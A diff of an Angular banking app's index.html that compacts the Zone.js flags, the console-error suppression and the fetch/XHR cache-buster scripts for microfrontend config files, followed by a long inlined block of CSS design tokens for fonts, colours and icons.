@@ -10,59 +10,37 @@
 
   <!-- Zone.js configuration MUST be set BEFORE zone.js loads -->
   <script>
-    // Configuración para Angular 19+ compatibility con module federation
-    // Estos flags deben establecerse ANTES de que zone.js se cargue
-    window.__Zone_disable_Error_ZoneAwareError = true; // Deshabilitar wrapping de errores
-    window.__Zone_enable_cross_context_check = false; // Deshabilitar checks estrictos de zona para microfrontends
-    window.__zone_symbol__UNPATCHED_EVENTS = ['scroll', 'mousemove', 'mouseenter', 'mouseleave']; // No parchear eventos de alta frecuencia
+    window.__Zone_disable_Error_ZoneAwareError = true;
+    window.__Zone_enable_cross_context_check = false;
+    window.__zone_symbol__UNPATCHED_EVENTS = ['scroll', 'mousemove', 'mouseenter', 'mouseleave'];
   </script>
-  <!-- NG0909 errors disabled in any microfrontend-->
+
+  <!-- NG0909 errors disabled -->
   <script>
     const originalError = console.error;
     const originalWarn = console.warn;
-    // Add here any error msg to be supressed.
-    const SUPPRESSED_ERRORS = [
-      'NG0909',
-      'NG09909',
-      'Expected to not be in Angular Zone'
-    ];
-    
+    const SUPPRESSED_ERRORS = ['NG0909', 'NG09909', 'Expected to not be in Angular Zone'];
     console.error = function(...args) {
       const message = args.join(' ');
-      if (SUPPRESSED_ERRORS.some(pattern => message.includes(pattern))) {
-        return;
-      }
+      if (SUPPRESSED_ERRORS.some(pattern => message.includes(pattern))) return;
       originalError.apply(console, args);
     };
-    
     console.warn = function(...args) {
       const message = args.join(' ');
-      if (SUPPRESSED_ERRORS.some(pattern => message.includes(pattern))) {
-        return;
-      }
+      if (SUPPRESSED_ERRORS.some(pattern => message.includes(pattern))) return;
       originalWarn.apply(console, args);
     };
   </script>
- <!-- Cache buster for microfrontends config.json -->
+
+  <!-- Cache buster -->
   <script>
     (function() {
       const CONFIG_VERSION = 'v26.4.32';
-      
-      // Micros which need cache buster in  config.json
-      const MICROS_TO_CACHE = [
-        'oneweb-global-position',
-        'legacy-spain',
-        'mf-ng-50080275-manager-area'
-      ];
-      
-      // Intercept fetch
+      const MICROS_TO_CACHE = ['oneweb-global-position', 'legacy-spain', 'mf-ng-50080275-manager-area'];
       const originalFetch = window.fetch;
       window.fetch = function(input, init) {
         let url = typeof input === 'string' ? input : (input instanceof URL ? input.href : (input instanceof Request ? input.url : String(input)));
-        
-        // Aplicar cache buster si la URL contiene alguno de los micros y config.json
         const shouldBust = MICROS_TO_CACHE.some(micro => url.includes(micro)) && url.includes('config.json');
-        
         if (shouldBust) {
           const separator = url.includes('?') ? '&' : '?';
           url = url + separator + 'v=' + CONFIG_VERSION;
@@ -72,15 +50,11 @@
         }
         return originalFetch.call(window, input, init);
       };
-      
-      // Intercept XMLHttpRequest
       const originalOpen = XMLHttpRequest.prototype.open;
       XMLHttpRequest.prototype.open = function() {
         let url = arguments[1];
         let finalUrl = typeof url === 'string' ? url : url.href;
-        
         const shouldBust = MICROS_TO_CACHE.some(micro => finalUrl.includes(micro)) && finalUrl.includes('config.json');
-        
         if (shouldBust) {
           const separator = finalUrl.includes('?') ? '&' : '?';
           arguments[1] = finalUrl + separator + 'v=' + CONFIG_VERSION;
@@ -89,624 +63,180 @@
       };
     })();
   </script>
-<style>html{overflow-y:scroll}html,body{font-family:var(--asset-font-2-regular-name, "Santander Micro Text"),"Verdana",sans-serif;color:var(--color-text-default, #222222);margin:0;padding:0}:root{--typescale-body-medium-default-font:Santander Micro Text;--typescale-body-medium-default-size:.875rem;--typescale-body-medium-default-line-height:1.25rem;--typescale-body-medium-default-weight:400;--typescale-body-medium-default-style:normal;--typescale-body-medium-strong-font:Santander Micro Text;--typescale-body-medium-strong-size:.875rem;--typescale-body-medium-strong-line-height:1.25rem;--typescale-body-medium-strong-weight:700;--typescale-body-medium-strong-style:normal;--typescale-body-large-default-font:Santander Micro Text;--typescale-body-large-default-size:1rem;--typescale-body-large-default-line-height:1.5rem;--typescale-body-large-default-weight:400;--typescale-body-large-default-style:normal;--typescale-body-large-strong-font:Santander Micro Text;--typescale-body-large-strong-size:1rem;--typescale-body-large-strong-line-height:1.5rem;--typescale-body-large-strong-weight:700;--typescale-body-large-strong-style:normal;--typescale-body-xlarge-default-font:Santander Micro Text;--typescale-body-xlarge-default-size:1.125rem;--typescale-body-xlarge-default-line-height:1.5rem;--typescale-body-xlarge-default-weight:400;--typescale-body-xlarge-default-style:normal;--typescale-body-xlarge-strong-font:Santander Micro Text;--typescale-body-xlarge-strong-size:1.125rem;--typescale-body-xlarge-strong-line-height:1.5rem;--typescale-body-xlarge-strong-weight:700;--typescale-body-xlarge-strong-style:normal}:root{--typescale-caption-default-font:Santander Micro Text;--typescale-caption-default-size:.75rem;--typescale-caption-default-line-height:1rem;--typescale-caption-default-weight:400;--typescale-caption-default-style:normal;--typescale-caption-strong-font:Santander Micro Text;--typescale-caption-strong-size:.75rem;--typescale-caption-strong-line-height:1rem;--typescale-caption-strong-weight:700;--typescale-caption-strong-style:normal}:root{--typescale-tag-font:Santander Micro Text;--typescale-tag-size:.875rem;--typescale-tag-line-height:1.25rem;--typescale-tag-weight:700;--typescale-tag-style:normal}:root{--typescale-label-medium-font:Santander Micro Text;--typescale-label-medium-size:.875rem;--typescale-label-medium-line-height:1.5rem;--typescale-label-medium-weight:400;--typescale-label-medium-style:normal;--typescale-label-large-font:Santander Micro Text;--typescale-label-large-size:1rem;--typescale-label-large-line-height:1.5rem;--typescale-label-large-weight:400;--typescale-label-large-style:normal}:root{--typescale-placeholder-font:Santander Micro Text;--typescale-placeholder-size:1rem;--typescale-placeholder-line-height:1.5rem;--typescale-placeholder-weight:400;--typescale-placeholder-style:normal}:root{--typescale-helper-text-font:Santander Micro Text;--typescale-helper-text-size:.875rem;--typescale-helper-text-line-height:1.25rem;--typescale-helper-text-weight:400;--typescale-helper-text-style:normal}:root{--typescale-amount-font:Santander Headline;--typescale-amount-size:1.5rem;--typescale-amount-line-height:2rem;--typescale-amount-weight:400;--typescale-amount-style:normal}:root{--typescale-badge-small-font:Santander Micro Text;--typescale-badge-small-size:.5rem;--typescale-badge-small-line-height:.625rem;--typescale-badge-small-weight:700;--typescale-badge-small-style:normal;--typescale-badge-medium-font:Santander Micro Text;--typescale-badge-medium-size:.6875;--typescale-badge-medium-line-height:1;--typescale-badge-medium-weight:700;--typescale-badge-medium-style:normal}:root{--typescale-button-large-font:Santander Micro Text;--typescale-button-large-size:1rem;--typescale-button-large-line-height:1.5rem;--typescale-button-large-weight:700;--typescale-button-large-style:normal;--typescale-button-medium-font:Santander Micro Text;--typescale-button-medium-size:.875rem;--typescale-button-medium-line-height:1.25rem;--typescale-button-medium-weight:700;--typescale-button-medium-style:normal}:root{--typescale-action-link-font:Santander Micro Text;--typescale-action-link-size:.875rem;--typescale-action-link-line-height:1.25rem;--typescale-action-link-weight:700;--typescale-action-link-style:normal}:root{--typescale-navbar-icon-label-default-font:Santander Micro Text;--typescale-navbar-icon-label-default-size:.625rem;--typescale-navbar-icon-label-default-line-height:1rem;--typescale-navbar-icon-label-default-weight:400;--typescale-navbar-icon-label-default-style:normal;--typescale-navbar-icon-label-strong-font:Santander Micro Text;--typescale-navbar-icon-label-strong-size:.625rem;--typescale-navbar-icon-label-strong-line-height:1rem;--typescale-navbar-icon-label-strong-weight:700;--typescale-navbar-icon-label-strong-style:normal}:root{--typescale-icon-label-xsmall-default-font:Santander Micro Text;--typescale-icon-label-xsmall-default-size:.625rem;--typescale-icon-label-xsmall-default-line-height:1rem;--typescale-icon-label-xsmall-default-weight:400;--typescale-icon-label-xsmall-default-style:normal;--typescale-icon-label-xsmall-strong-font:Santander Micro Text;--typescale-icon-label-xsmall-strong-size:.625rem;--typescale-icon-label-xsmall-strong-line-height:1rem;--typescale-icon-label-xsmall-strong-weight:700;--typescale-icon-label-xsmall-strong-style:normal;--typescale-icon-label-small-default-font:Santander Micro Text;--typescale-icon-label-small-default-size:.75rem;--typescale-icon-label-small-default-line-height:1rem;--typescale-icon-label-small-default-weight:400;--typescale-icon-label-small-default-style:normal;--typescale-icon-label-small-strong-font:Santander Micro Text;--typescale-icon-label-small-strong-size:.75rem;--typescale-icon-label-small-strong-line-height:1rem;--typescale-icon-label-small-strong-weight:700;--typescale-icon-label-small-strong-style:normal}:root{--typescale-figure-xsmall-default-font:Santander Headline;--typescale-figure-xsmall-default-size:.75rem;--typescale-figure-xsmall-default-line-height:1rem;--typescale-figure-xsmall-default-weight:400;--typescale-figure-xsmall-default-style:normal;--typescale-figure-xsmall-strong-font:Santander Headline;--typescale-figure-xsmall-strong-size:.75rem;--typescale-figure-xsmall-strong-line-height:1rem;--typescale-figure-xsmall-strong-weight:700;--typescale-figure-xsmall-strong-style:normal;--typescale-figure-small-default-font:Santander Headline;--typescale-figure-small-default-size:.875rem;--typescale-figure-small-default-line-height:1.25rem;--typescale-figure-small-default-weight:400;--typescale-figure-small-default-style:normal;--typescale-figure-small-strong-font:Santander Headline;--typescale-figure-small-strong-size:.875rem;--typescale-figure-small-strong-line-height:1.25rem;--typescale-figure-small-strong-weight:700;--typescale-figure-small-strong-style:normal;--typescale-figure-medium-default-font:Santander Headline;--typescale-figure-medium-default-size:1rem;--typescale-figure-medium-default-line-height:1.5rem;--typescale-figure-medium-default-weight:400;--typescale-figure-medium-default-style:normal;--typescale-figure-medium-strong-font:Santander Headline;--typescale-figure-medium-strong-size:1rem;--typescale-figure-medium-strong-line-height:1.5rem;--typescale-figure-medium-strong-weight:700;--typescale-figure-medium-strong-style:normal;--typescale-figure-large-default-font:Santander Headline;--typescale-figure-large-default-size:1.125rem;--typescale-figure-large-default-line-height:1.5rem;--typescale-figure-large-default-weight:400;--typescale-figure-large-default-style:normal;--typescale-figure-large-strong-font:Santander Headline;--typescale-figure-large-strong-size:1.125rem;--typescale-figure-large-strong-line-height:1.5rem;--typescale-figure-large-strong-weight:700;--typescale-figure-large-strong-style:normal;--typescale-figure-xlarge-default-font:Santander Headline;--typescale-figure-xlarge-default-size:1.5rem;--typescale-figure-xlarge-default-line-height:1.75rem;--typescale-figure-xlarge-default-weight:400;--typescale-figure-xlarge-default-style:normal;--typescale-figure-xlarge-strong-font:Santander Headline;--typescale-figure-xlarge-strong-size:1.5rem;--typescale-figure-xlarge-strong-line-height:1.75rem;--typescale-figure-xlarge-strong-weight:700;--typescale-figure-xlarge-strong-style:normal;--typescale-figure-xxlarge-default-font:Santander Headline;--typescale-figure-xxlarge-default-size:2rem;--typescale-figure-xxlarge-default-line-height:2.25rem;--typescale-figure-xxlarge-default-weight:400;--typescale-figure-xxlarge-default-style:normal;--typescale-figure-xxlarge-strong-font:Santander Headline;--typescale-figure-xxlarge-strong-size:2rem;--typescale-figure-xxlarge-strong-line-height:2.25rem;--typescale-figure-xxlarge-strong-weight:700;--typescale-figure-xxlarge-strong-style:normal;--typescale-figure-xxxlarge-default-font:Santander Headline;--typescale-figure-xxxlarge-default-size:2.625rem;--typescale-figure-xxxlarge-default-line-height:3.25rem;--typescale-figure-xxxlarge-default-weight:400;--typescale-figure-xxxlarge-default-style:normal;--typescale-figure-xxxlarge-strong-font:Santander Headline;--typescale-figure-xxxlarge-strong-size:2.625rem;--typescale-figure-xxxlarge-strong-line-height:3.25rem;--typescale-figure-xxxlarge-strong-weight:700;--typescale-figure-xxxlarge-strong-style:normal;--typescale-figure-xxxxlarge-default-font:Santander Headline;--typescale-figure-xxxxlarge-default-size:3.375rem;--typescale-figure-xxxxlarge-default-line-height:4rem;--typescale-figure-xxxxlarge-default-weight:400;--typescale-figure-xxxxlarge-default-style:normal;--typescale-figure-xxxxlarge-strong-font:Santander Headline;--typescale-figure-xxxxlarge-strong-size:3.375rem;--typescale-figure-xxxxlarge-strong-line-height:4rem;--typescale-figure-xxxxlarge-strong-weight:700;--typescale-figure-xxxxlarge-strong-style:normal}:root{--typescale-avatar-small-font:Santander Headline;--typescale-avatar-small-size:.875rem;--typescale-avatar-small-line-height:1.25rem;--typescale-avatar-small-weight:700;--typescale-avatar-small-style:normal;--typescale-avatar-medium-font:Santander Headline;--typescale-avatar-medium-size:1rem;--typescale-avatar-medium-line-height:1.5rem;--typescale-avatar-medium-weight:700;--typescale-avatar-medium-style:normal;--typescale-avatar-large-font:Santander Headline;--typescale-avatar-large-size:1.25rem;--typescale-avatar-large-line-height:1.5rem;--typescale-avatar-large-weight:700;--typescale-avatar-large-style:normal;--typescale-avatar-xlarge-font:Santander Headline;--typescale-avatar-xlarge-size:1.75rem;--typescale-avatar-xlarge-line-height:2rem;--typescale-avatar-xlarge-weight:700;--typescale-avatar-xlarge-style:normal}:root{--typescale-display-small-default-font:Santander Headline;--typescale-display-small-default-size:2.625rem;--typescale-display-small-default-line-height:3.25rem;--typescale-display-small-default-weight:400;--typescale-display-small-default-style:normal;--typescale-display-small-strong-font:Santander Headline;--typescale-display-small-strong-size:2.625rem;--typescale-display-small-strong-line-height:3.25rem;--typescale-display-small-strong-weight:700;--typescale-display-small-strong-style:normal;--typescale-display-large-default-font:Santander Headline;--typescale-display-large-default-size:3rem;--typescale-display-large-default-line-height:3.75rem;--typescale-display-large-default-weight:400;--typescale-display-large-default-style:normal;--typescale-display-large-strong-font:Santander Headline;--typescale-display-large-strong-size:3rem;--typescale-display-large-strong-line-height:3.75rem;--typescale-display-large-strong-weight:700;--typescale-display-large-strong-style:normal;--typescale-display-xlarge-default-font:Santander Headline;--typescale-display-xlarge-default-size:3.375rem;--typescale-display-xlarge-default-line-height:4rem;--typescale-display-xlarge-default-weight:400;--typescale-display-xlarge-default-style:normal;--typescale-display-xlarge-strong-font:Santander Headline;--typescale-display-xlarge-strong-size:3.375rem;--typescale-display-xlarge-strong-line-height:4rem;--typescale-display-xlarge-strong-weight:700;--typescale-display-xlarge-strong-style:normal}:root{--typescale-headline-small-font:Santander Headline;--typescale-headline-small-size:1.125rem;--typescale-headline-small-line-height:1.5rem;--typescale-headline-small-weight:700;--typescale-headline-small-style:normal;--typescale-headline-medium-font:Santander Headline;--typescale-headline-medium-size:1.25rem;--typescale-headline-medium-line-height:1.5rem;--typescale-headline-medium-weight:700;--typescale-headline-medium-style:normal;--typescale-headline-large-font:Santander Headline;--typescale-headline-large-size:1.5rem;--typescale-headline-large-line-height:2rem;--typescale-headline-large-weight:700;--typescale-headline-large-style:normal;--typescale-headline-xlarge-font:Santander Headline;--typescale-headline-xlarge-size:1.75rem;--typescale-headline-xlarge-line-height:2rem;--typescale-headline-xlarge-weight:700;--typescale-headline-xlarge-style:normal}:root{--typescale-mobile-display-small-default-font:Santander Headline;--typescale-mobile-display-small-default-size:1.75rem;--typescale-mobile-display-small-default-line-height:2rem;--typescale-mobile-display-small-default-weight:300;--typescale-mobile-display-small-default-style:normal;--typescale-mobile-display-small-strong-font:Santander Headline;--typescale-mobile-display-small-strong-size:1.75rem;--typescale-mobile-display-small-strong-line-height:2rem;--typescale-mobile-display-small-strong-weight:400;--typescale-mobile-display-small-strong-style:normal;--typescale-mobile-display-large-default-font:Santander Headline;--typescale-mobile-display-large-default-size:2.625rem;--typescale-mobile-display-large-default-line-height:3.25rem;--typescale-mobile-display-large-default-weight:300;--typescale-mobile-display-large-default-style:normal;--typescale-mobile-display-large-strong-font:Santander Headline;--typescale-mobile-display-large-strong-size:2.625rem;--typescale-mobile-display-large-strong-line-height:3.25rem;--typescale-mobile-display-large-strong-weight:400;--typescale-mobile-display-large-strong-style:normal}:root{--typescale-mobile-headline-small-font:Santander Headline;--typescale-mobile-headline-small-size:1rem;--typescale-mobile-headline-small-line-height:1.5rem;--typescale-mobile-headline-small-weight:700;--typescale-mobile-headline-small-style:normal;--typescale-mobile-headline-medium-font:Santander Headline;--typescale-mobile-headline-medium-size:1.125rem;--typescale-mobile-headline-medium-line-height:1.5rem;--typescale-mobile-headline-medium-weight:700;--typescale-mobile-headline-medium-style:normal;--typescale-mobile-headline-large-font:Santander Headline;--typescale-mobile-headline-large-size:1.25rem;--typescale-mobile-headline-large-line-height:1.5rem;--typescale-mobile-headline-large-weight:700;--typescale-mobile-headline-large-style:normal;--typescale-mobile-headline-xlarge-font:Santander Headline;--typescale-mobile-headline-xlarge-size:1.5rem;--typescale-mobile-headline-xlarge-line-height:2rem;--typescale-mobile-headline-xlarge-weight:700;--typescale-mobile-headline-xlarge-style:normal}:root{--size-border-radius-01:0rem;--size-border-radius-02:.25rem;--size-border-radius-03:.5rem;--size-border-radius-04:.75rem;--size-border-radius-05:3.125rem;--size-border-radius-06:.125rem;--size-border-width-01:.0625rem;--size-border-width-02:.125rem}:root{--size-spacing-10:3.5rem;--size-spacing-11:4rem;--size-spacing-12:4.5rem;--size-spacing-13:5rem;--size-spacing-14:5.5rem;--size-spacing-15:6rem;--size-spacing-00:.125rem;--size-spacing-01:.25rem;--size-spacing-02:.5rem;--size-spacing-03:.75rem;--size-spacing-04:1rem;--size-spacing-05:1.25rem;--size-spacing-06:1.5rem;--size-spacing-07:2rem;--size-spacing-08:2.5rem;--size-spacing-09:3rem}:root{--color-dataviz-max-8-colors-01:#cc0000;--color-dataviz-max-8-colors-02:#1bb3bc;--color-dataviz-max-8-colors-03:#9e3667;--color-dataviz-max-8-colors-04:#9bc3d3;--color-dataviz-max-8-colors-05:#ffcc33;--color-dataviz-max-8-colors-06:#63ba68;--color-dataviz-max-8-colors-07:#3366ff;--color-dataviz-max-8-colors-08:#444444;--color-dataviz-max-15-colors-10:#856300;--color-dataviz-max-15-colors-11:#63ba68;--color-dataviz-max-15-colors-12:#008035;--color-dataviz-max-15-colors-13:#3366ff;--color-dataviz-max-15-colors-14:#0032e6;--color-dataviz-max-15-colors-15:#444444;--color-dataviz-max-15-colors-01:#cc0000;--color-dataviz-max-15-colors-02:#990000;--color-dataviz-max-15-colors-03:#1bb3bc;--color-dataviz-max-15-colors-04:#137e84;--color-dataviz-max-15-colors-05:#9e3667;--color-dataviz-max-15-colors-06:#732645;--color-dataviz-max-15-colors-07:#9bc3d3;--color-dataviz-max-15-colors-08:#cedee7;--color-dataviz-max-15-colors-09:#ffcc33;--color-dataviz-max-20-colors-10:#cedee7;--color-dataviz-max-20-colors-11:#ffcc33;--color-dataviz-max-20-colors-12:#856300;--color-dataviz-max-20-colors-13:#ffe185;--color-dataviz-max-20-colors-14:#63ba68;--color-dataviz-max-20-colors-15:#008035;--color-dataviz-max-20-colors-16:#a2d6a5;--color-dataviz-max-20-colors-17:#3366ff;--color-dataviz-max-20-colors-18:#0032e6;--color-dataviz-max-20-colors-19:#85a4ff;--color-dataviz-max-20-colors-20:#444444;--color-dataviz-max-20-colors-01:#cc0000;--color-dataviz-max-20-colors-02:#990000;--color-dataviz-max-20-colors-03:#1bb3bc;--color-dataviz-max-20-colors-04:#137e84;--color-dataviz-max-20-colors-05:#77d2d7;--color-dataviz-max-20-colors-06:#9e3667;--color-dataviz-max-20-colors-07:#732645;--color-dataviz-max-20-colors-08:#c587a4;--color-dataviz-max-20-colors-09:#9bc3d3}:root{--color-action-main-default:#ec0000;--color-action-main-hover:#cc0000;--color-action-main-selected:#ec0000;--color-action-on-main-default:#ffffff;--color-action-on-main-hover:#ffffff;--color-action-on-main-selected:#ffffff;--color-action-alternative-default:#127277;--color-action-alternative-hover:#0d5155;--color-action-alternative-selected:#127277;--color-action-on-alternative-default:#ffffff;--color-action-on-alternative-hover:#ffffff;--color-action-on-alternative-selected:#ffffff;--color-action-alternative-inverted-default:#ffffff;--color-action-alternative-inverted-hover:rgba(255, 255, 255, .75);--color-action-alternative-inverted-selected:rgba(255, 255, 255, .75);--color-action-disabled:rgba(34, 34, 34, .06);--color-action-on-disabled:rgba(34, 34, 34, .23);--color-action-on-disabled-inverted:rgba(255, 255, 255, .6)}:root{--color-background-default:#ffffff;--color-background-alternative:#f5f9fb;--color-background-soft:#f0f0f0;--color-background-alternative-strong:#deedf2;--color-background-strong:#8f8f8f;--color-background-inverted:#222222;--color-background-brand:#ec0000;--color-background-brand-strong:#cc0000;--color-background-overlay:rgba(34, 34, 34, .5);--color-background-info:#f5f9fb;--color-background-success:#f0f8f0;--color-background-warning:#fffaeb;--color-background-error:#fee5e5}:root{--color-surface-flat:#ffffff;--color-surface-raised:#ffffff;--color-surface-floating:#ffffff;--color-surface-disabled:rgba(34, 34, 34, .06);--color-surface-read-only:rgba(34, 34, 34, .2);--color-surface-state-default:rgba(34, 34, 34, 0);--color-surface-state-hover:rgba(34, 34, 34, .04);--color-surface-state-pressed:rgba(34, 34, 34, .1);--color-surface-state-selected:rgba(19, 126, 132, .08);--color-surface-state-selected-hover:rgba(19, 126, 132, .12);--color-surface-state-disabled:rgba(34, 34, 34, 0);--color-surface-state-read-only:rgba(34, 34, 34, 0)}:root{--color-text-default:#222222;--color-text-soft:#727272;--color-text-disabled:rgba(34, 34, 34, .23);--color-text-inverted:#ffffff;--color-text-brand:#ec0000;--color-text-info:#23779a;--color-text-success:#008035;--color-text-warning:#856300;--color-text-error:#990000}:root{--color-border-default:#8f8f8f;--color-border-soft:#cccccc;--color-border-hover:#222222;--color-border-disabled:#cccccc;--color-border-alternative:#cedee7;--color-border-inverted:#ffffff;--color-border-info:#23779a;--color-border-success:#008035;--color-border-warning:#856300;--color-border-error:#990000}:root{--color-effect-shadow:rgba(163, 163, 163, .4);--color-effect-focus-inner:#ffffff;--color-effect-focus-outer:#3366ff}:root{--color-button-secondary-default:#ffffff;--color-button-secondary-hover:#f6f6f6;--color-button-on-secondary-default:#ec0000;--color-button-on-secondary-hover:#cc0000}:root{--color-header-background:#ffffff;--color-header-background-alternative:#ec0000;--color-header-on-background:#222222;--color-header-border:#cedee7;--color-header-icon:#ec0000}:root{--color-navbar-background:#ffffff;--color-navbar-on-background:#ec0000;--color-navbar-on-background-icon-label:#222222;--color-navbar-background-sticky:#ffffff;--color-navbar-background-alternative:#cc0000;--color-navbar-on-background-alternative:#ffffff;--color-navbar-on-background-alternative-icon-label:#ffffff;--color-navbar-background-inverted:rgba(255, 255, 255, 0);--color-navbar-on-background-inverted:#ffffff;--color-navbar-on-background-inverted-icon-label:#ffffff}:root{--color-loader-background:rgba(255, 255, 255, .96)}:root{--color-decorative-boston:#cc0000;--color-decorative-ruby:#990000;--color-decorative-yellow:#856300;--color-decorative-green:#008035;--color-decorative-turquoise:#127277;--color-decorative-blue:#0032e6;--color-decorative-purple:#732645;--color-decorative-sky:#23779a}:root{--color-tag-primary:#23779a;--color-tag-promo:#ffcc33}:root{--color-highlighted-text-background:#ffe185}:root{--elevation-flat:0 0 0 rgba(163,163,163,0);--elevation-flat-focus-outer:0px 0px 0px 2px rgba(255,255,255,1), 0px 0px 0px 4px rgba(51,102,255,1);--elevation-flat-focus-inner:inset 0px 0px 0px 2px rgba(255,255,255,1), inset 0px 0px 0px 4px rgba(51,102,255,1);--elevation-raised:0 1px 6px rgba(163,163,163,.4);--elevation-raised-focus:0px 1px 6px rgba(163,163,163,.4), 0px 0px 0px 2px rgba(255,255,255,1), 0px 0px 0px 4px rgba(51, 102, 255, 1);--elevation-floating:0 1px 10px rgba(163,163,163,.4);--elevation-floating-focus:0px 1px 10px rgba(163,163,163,.4), 0px 0px 0px 2px rgba(255,255,255,1), 0px 0px 0px 4px rgba(51, 102, 255, 1)}:root{--asset-font-icons:"SantanderIcons";--asset-font-icons-woff-2:"assets/fonts/SantanderIcons/SantanderIcons.woff2";--asset-font-icons-woff:"assets/fonts/SantanderIcons/SantanderIcons.woff";--asset-font-icons-eot:"assets/fonts/SantanderIcons/SantanderIcons.eot";--asset-font-icons-ttf:"assets/fonts/SantanderIcons/SantanderIcons.ttf";--asset-font-icons-svg:"assets/fonts/SantanderIcons/SantanderIcons.svg"}:root{--icon-santander:"\aa010";--icon-now-logo:"\aa020";--icon-dollar-symbol:"\ab010";--icon-euro-symbol:"\ab011";--icon-pound-symbol:"\ab012";--icon-remittances-dollar:"\ab020";--icon-remittances-euro:"\ab021";--icon-remittances-pound:"\ab022";--icon-dollar:"\ab030";--icon-euro:"\ab031";--icon-pound:"\ab032";--icon-finance-purchase-dollar:"\ab040";--icon-finance-purchase-euro:"\ab041";--icon-finance-purchase-pound:"\ab042";--icon-account-group-dollar:"\ab050";--icon-account-group-euro:"\ab051";--icon-account-group-pound:"\ab052";--icon-redemption-dollar:"\ab060";--icon-redemption-euro:"\ab061";--icon-redemption-pound:"\ab062";--icon-send-to-a-favourite:"\ab065";--icon-change-account-associate-dollar:"\ab070";--icon-change-account-associate-euro:"\ab071";--icon-change-account-associate-pound:"\ab072";--icon-change-account-associate-poland-zloty:"\ab073";--icon-account-management-dollar:"\ab080";--icon-account-management-euro:"\ab081";--icon-account-management-pound:"\ab082";--icon-account-bonus-dollar:"\ab090";--icon-account-bonus-euro:"\ab091";--icon-account-bonus-pound:"\ab092";--icon-saving-account-dollar:"\ab100";--icon-saving-account-euro:"\ab101";--icon-saving-account-pound:"\ab102";--icon-bag-of-money-dollar:"\ab110";--icon-bag-of-money-euro:"\ab111";--icon-bag-of-money-pound:"\ab112";--icon-bag-of-money-taxes:"\ab113";--icon-dollar-bill:"\ab120";--icon-euro-bill-note:"\ab121";--icon-pound-note:"\ab122";--icon-bill:"\ab123";--icon-money-cash-dollar:"\ab130";--icon-money-cash-euro:"\ab131";--icon-money-cash-pound:"\ab132";--icon-payment-dollar:"\ab140";--icon-payment-euro:"\ab141";--icon-payment-pound:"\ab142";--icon-one-time-payment-dollar:"\ab150";--icon-one-time-payment-euro:"\ab151";--icon-one-time-payment-pound:"\ab152";--icon-payment-in-progress-dollar:"\ab160";--icon-payment-in-progress-euro:"\ab161";--icon-payment-in-progress-pound:"\ab162";--icon-recurrent-payment-dollar:"\ab170";--icon-recurrent-payment-euro:"\ab171";--icon-recurrent-payment-pound:"\ab172";--icon-schedule-payment-dollar:"\ab180";--icon-schedule-payment-euro:"\ab181";--icon-schedule-payment-pound:"\ab182";--icon-atm-dollar:"\ab190";--icon-atm-euro:"\ab191";--icon-atm-pound:"\ab192";--icon-withdraw-dollar:"\ab200";--icon-withdraw-euro:"\ab201";--icon-withdraw-pound:"\ab202";--icon-levy-received-dollar:"\ab210";--icon-levy-received-euro:"\ab211";--icon-levy-received-pound:"\ab212";--icon-confirming-advances-dollar:"\ab220";--icon-confirming-advances-euro:"\ab221";--icon-confirming-advances-pound:"\ab222";--icon-factoring-dollar:"\ab230";--icon-factoring-euro:"\ab231";--icon-factoring-pound:"\ab232";--icon-statements-dollar:"\ab240";--icon-statements-euro:"\ab241";--icon-statements-pound:"\ab242";--icon-paysheet-dollar:"\ab250";--icon-paysheet-euro:"\ab251";--icon-paysheet-pound:"\ab252";--icon-levy-sent-dollar:"\ab260";--icon-levy-sent-euro:"\ab261";--icon-levy-sent-pound:"\ab262";--icon-email-invoice-dollar:"\ab270";--icon-email-invoice-euro:"\ab271";--icon-email-invoice-pound:"\ab272";--icon-schedule-spending-dollar:"\ab280";--icon-schedule-spending-euro:"\ab281";--icon-schedule-spending-pound:"\ab282";--icon-account-search-dollar:"\ab290";--icon-account-search-euro:"\ab291";--icon-account-search-pound:"\ab292";--icon-online-value-dollar:"\ab300";--icon-online-value-euro:"\ab301";--icon-online-value-pound:"\ab302";--icon-mortgages-dollar:"\ab400";--icon-mortgages-euro:"\ab401";--icon-mortgages-pound:"\ab402";--icon-exhange:"\ab500";--icon-checking-account:"\ab510";--icon-checking-account-change:"\ab520";--icon-checking-account-closing:"\ab530";--icon-checking-account-open:"\ab540";--icon-portability:"\ab550";--icon-price:"\ab560";--icon-franc-switzerland:"\ab592";--icon-ngultrum-bhutan:"\ab593";--icon-dollar-timor-leste:"\ab594";--icon-rupiah-indonesia:"\ab595";--icon-metical-mozambique:"\ab596";--icon-pound-lebanon:"\ab597";--icon-dinar-tunisia:"\ab598";--icon-dollar-guyana:"\ab599";--icon-riyal-saudi-rupee-seychelles:"\ab600";--icon-kip:"\ab601";--icon-ringgit-malaysia:"\ab602";--icon-baht-thailand:"\ab603";--icon-franc-guinea:"\ab604";--icon-franc-rwanda:"\ab605";--icon-tenge-kazakhstan:"\ab606";--icon-dollar-brunei-bahamian:"\ab607";--icon-dinar-bahrain:"\ab608";--icon-dalasi-gambia:"\ab609";--icon-riyal-qatar:"\ab610";--icon-dinar-kuwait:"\ab611";--icon-ouguiya:"\ab612";--icon-pound-syria:"\ab613";--icon-rupee-pakistan:"\ab614";--icon-lev-bulgaria:"\ab615";--icon-franc-comoros:"\ab616";--icon-togrog:"\ab617";--icon-taka:"\ab618";--icon-kyat-kwacha:"\ab619";--icon-peso-philippines:"\ab620";--icon-dobra-sao-tome:"\ab621";--icon-pound-egypt:"\ab622";--icon-ariary-madagascar:"\ab623";--icon-rial-oman:"\ab624";--icon-rial-iran:"\ab625";--icon-shilling-somalia:"\ab626";--icon-dinar-algeria:"\ab627";--icon-rupee-nepal:"\ab628";--icon-dinar-iraq:"\ab629";--icon-kwanza:"\ab630";--icon-leone:"\ab631";--icon-dollar-jamaica:"\ab632";--icon-franc-congo:"\ab633";--icon-rand:"\ab634";--icon-naira-nigeria:"\ab635";--icon-rupee-india:"\ab636";--icon-dollar-singapore:"\ab637";--icon-florin-guilder:"\ab638";--icon-dong-vietnam:"\ab639";--icon-dinar-libya:"\ab640";--icon-pula-botswana:"\ab641";--icon-new-shekel-israel:"\ab642";--icon-dollar-liberia:"\ab643";--icon-dollar-namibia:"\ab644";--icon-pound-sudan:"\ab645";--icon-peso-uruguay:"\ab646";--icon-dirham:"\ab647";--icon-kuna:"\ab648";--icon-ruble-russia:"\ab649";--icon-dram:"\ab650";--icon-mark:"\ab651";--icon-lev:"\ab652";--icon-lari:"\ab653";--icon-forint:"\ab654";--icon-lira:"\ab655";--icon-hryvnia:"\ab656";--icon-ruble-belarus:"\ab657";--icon-denar:"\ab658";--icon-dinar:"\ab659";--icon-krona-krone:"\ab660";--icon-koruna